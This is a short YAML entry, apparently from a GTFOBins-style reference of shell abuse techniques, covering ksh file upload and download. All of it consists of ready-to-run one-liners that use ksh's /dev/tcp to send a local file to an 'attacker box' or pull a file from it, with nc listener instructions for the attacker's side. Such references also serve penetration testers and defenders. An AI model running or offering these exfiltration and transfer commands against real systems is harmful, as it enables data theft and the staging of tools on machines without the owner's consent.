---
functions:
  file-upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        ksh -c 'echo -e "POST / HTTP/0.9\n\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
            3<>/dev/tcp/$RHOST/$RPORT \
            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 4444 < "file_to_send"` on the attacker box to send the file.
      code: |
        ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
---
